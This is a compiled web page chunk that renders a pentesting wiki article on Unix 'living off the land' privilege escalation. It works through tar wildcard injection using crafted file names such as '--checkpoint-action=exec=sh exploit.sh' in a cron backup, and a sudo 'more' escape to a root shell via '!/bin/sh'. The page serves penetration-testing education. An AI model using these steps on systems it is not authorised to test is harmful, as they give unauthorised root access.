import{_ as s,c as e,a5 as n,o as i}from"./chunks/framework.B5CpDqM0.js";const u=JSON.parse('{"title":"🛠️ Living off the land","description":"","frontmatter":{"authors":"ShutdownRepo, p0dalirius"},"headers":[],"relativePath":"infra/privilege-escalation/unix/living-off-the-land.md","filePath":"infra/privilege-escalation/unix/living-off-the-land.md","lastUpdated":1724982529000}'),p={name:"infra/privilege-escalation/unix/living-off-the-land.md"};function l(r,a,t,o,c,d){return i(),e("div",null,a[0]||(a[0]=[n(`<h1 id="🛠️-living-off-the-land" tabindex="-1">🛠️ Living off the land <a class="header-anchor" href="#🛠️-living-off-the-land" aria-label="Permalink to &quot;🛠️ Living off the land&quot;">​</a></h1><h2 id="theory" tabindex="-1">Theory <a class="header-anchor" href="#theory" aria-label="Permalink to &quot;Theory&quot;">​</a></h2><p>Living of the Land is a well known privilege escalation technique, where an attacker will leverage binaries found on the attacked machine to perform a privilege escalation. Indeed, many UNIX programs have options that can be exploited to open a shell. Therefore if we can start the program we exploit as another user, we might be able to open a shell as this user !</p><p>Most of the payloads to do this on UNIX programs can be found on <a href="https://gtfobins.github.io/" target="_blank" rel="noreferrer">gtfobins.github.io</a>.</p><h2 id="practice" tabindex="-1">Practice <a class="header-anchor" href="#practice" aria-label="Permalink to &quot;Practice&quot;">​</a></h2><p>Here are two case study to better understand the principle of these privilege escalations :</p><h3 id="case-study-1-privesc-using-tar-and-a-cronjob" tabindex="-1">Case study 1 : Privesc using tar and a cronjob <a class="header-anchor" href="#case-study-1-privesc-using-tar-and-a-cronjob" aria-label="Permalink to &quot;Case study 1 : Privesc using tar and a cronjob&quot;">​</a></h3><p>Imagine a scenario where a script backups a directory (that we can control) on the server each hour using <code>tar</code> like this :</p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>#!/bin/bash</span></span>
<span class="line"><span></span></span>
<span class="line"><span>mkdir -p /backups/</span></span>
<span class="line"><span>cd /var/www/html/ &amp;&amp; tar cvzf /backups/backup_$(date +%Y_%m_%d_%Hh%M).tar.gz *</span></span></code></pre></div><p>Notice this interesting pattern <code>tar czvf file.tar.gz *</code> in the script. This is a security vulnerability because of how UNIX shells handles wildcards. Let&#39;s see an example with the <code>ls</code> command :</p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>$ ls -lha</span></span>
<span class="line"><span>total 84K</span></span>
<span class="line"><span>drwxrwxr-x 2 user user 4,0K avril 27 22:32 .</span></span>
<span class="line"><span>drwxrwxrwt 89 user user 76K avril 27 22:31 ..</span></span>
<span class="line"><span>-rw-rw-r-- 1 user user 0 avril 27 22:31 file1</span></span>
<span class="line"><span>-rw-rw-r-- 1 user user 0 avril 27 22:31 file2</span></span>
<span class="line"><span>-rw-rw-r-- 1 user user 0 avril 27 22:31 file3</span></span>
<span class="line"><span>$ ls *</span></span>
<span class="line"><span>file1 file2 file3</span></span>
<span class="line"><span></span></span>
<span class="line"><span>$ echo &#39;&#39; &gt; &#39;-lha&#39;</span></span>
<span class="line"><span>$ ls -lha </span></span>
<span class="line"><span>total 88K</span></span>
<span class="line"><span>drwxrwxr-x 2 user user 4,0K avril 27 22:32 .</span></span>
<span class="line"><span>drwxrwxrwt 89 user user 76K avril 27 22:31 ..</span></span>
<span class="line"><span>-rw-rw-r-- 1 user user 0 avril 27 22:31 file1</span></span>
<span class="line"><span>-rw-rw-r-- 1 user user 0 avril 27 22:31 file2</span></span>
<span class="line"><span>-rw-rw-r-- 1 user user 0 avril 27 22:31 file3</span></span>
<span class="line"><span>-rw-rw-r-- 1 user user 1 avril 27 22:32 -lha</span></span>
<span class="line"><span>$ ls *</span></span>
<span class="line"><span>-rw-rw-r-- 1 user user 0 avril 27 22:31 file1</span></span>
<span class="line"><span>-rw-rw-r-- 1 user user 0 avril 27 22:31 file2</span></span>
<span class="line"><span>-rw-rw-r-- 1 user user 0 avril 27 22:31 file3</span></span></code></pre></div><p>The shell wildcards are resolved by the shell, and not by the command. This means filenames can be treated as options if they are starting with a <code>-</code>. In our previous example, we added a file called <code>-lha</code> into the folder. When we type <code>ls *</code>, the shell replaces the <code>*</code> by all matching files in the current directory, and therefore our command becomes <code>ls file1 file2 file3 -lha</code>. After the wildcard resolution, the shell executes the command with our options.</p><p>Now if we get back to our script creating a backup of a directory each our with <code>tar *</code>, we see that tar have legitimate options allowing execution of a program. You can find them here :</p><ul><li><a href="https://gtfobins.github.io/gtfobins/tar/#shell" target="_blank" rel="noreferrer">https://gtfobins.github.io/gtfobins/tar/#shell</a></li></ul><p>To use these options in our exploit, we jut need to create these two files in our directory, as well as the <code>exploit.sh</code> file, containing the command we want to run when we trigger the execution :</p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>echo &#39;&#39; &gt; &#39;--checkpoint=1&#39;</span></span>
<span class="line"><span>echo &#39;&#39; &gt; &#39;--checkpoint-action=exec=sh exploit.sh&#39;</span></span>
<span class="line"><span></span></span>
<span class="line"><span>$ ls -lha </span></span>
<span class="line"><span>total 88K</span></span>
<span class="line"><span>drwxrwxr-x 2 user user 4,0K avril 27 22:32 .</span></span>
<span class="line"><span>drwxrwxrwt 89 user user 76K avril 27 22:31 ..</span></span>
<span class="line"><span>-rw-rw-r-- 1 user user 0 avril 27 22:31 file1</span></span>
<span class="line"><span>-rw-rw-r-- 1 user user 0 avril 27 22:31 file2</span></span>
<span class="line"><span>-rw-rw-r-- 1 user user 1 avril 27 22:31 &#39;--checkpoint=1&#39;</span></span>
<span class="line"><span>-rw-rw-r-- 1 user user 1 avril 27 22:32 &#39;--checkpoint-action=exec=sh exploit.sh&#39;</span></span>
<span class="line"><span>-rwxrwxrwx 1 user user 784 avril 27 22:32 exploit.sh</span></span></code></pre></div><p>We are now ready ! We just need to wait until the directory is backup again, and it will trigger our payload and execute <code>exploit.sh</code> file!</p><h3 id="case-study-2-privesc-using-more-and-sudo" tabindex="-1">Case study 2 : Privesc using more and sudo <a class="header-anchor" href="#case-study-2-privesc-using-more-and-sudo" aria-label="Permalink to &quot;Case study 2 : Privesc using more and sudo&quot;">​</a></h3><p>Let&#39;s take an example, with this <code>sudo</code> configuration :</p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>$ sudo -l</span></span>
<span class="line"><span>[sudo] password for user: </span></span>
<span class="line"><span>Matching Defaults entries for user on PC1:</span></span>
<span class="line"><span> env_reset, mail_badpass,</span></span>
<span class="line"><span> secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin</span></span>
<span class="line"><span></span></span>
<span class="line"><span>User user may run the following commands on PC1:</span></span>
<span class="line"><span> (ALL : NOPASSWD) /usr/bin/more /var/log/apache2/access.log</span></span></code></pre></div><p>In this case <code>user</code> can run the <code>more</code> command, but only to read a specific log file <code>/var/log/apache2/access.log</code> as <code>root</code> without password (<code>NOPASSWD</code> flag) :</p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>sudo -u root /usr/bin/more /var/log/apache2/access.log</span></span></code></pre></div><p>You can assume this would be safe right ? Unfortunately, it&#39;s not. The <code>more</code> command has various useful options, one of them is <code>!</code>. When you&#39;re in <code>more</code> and you type an exclamation mark followed by the path to a binary file, you can execute it in a subprocess. For example if you type <code>!/bin/sh</code> in <code>more</code>, you will open a shell as the owner of the parent <code>more</code> process !</p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>$ sudo -u root /usr/bin/more /var/log/apache2/access.log</span></span>
<span class="line"><span>File content line 1</span></span>
<span class="line"><span>File content line 2</span></span>
<span class="line"><span>...</span></span>
<span class="line"><span>File content line n</span></span>
<span class="line"><span>------------------------</span></span>
<span class="line"><span>!/bin/sh</span></span>
<span class="line"><span># </span></span>
<span class="line"><span>uid=0(root) gid=0(root) groups=0(root)</span></span>
<span class="line"><span>#</span></span></code></pre></div>`,24)]))}const g=s(p,[["render",l]]);export{u as __pageData,g as default};
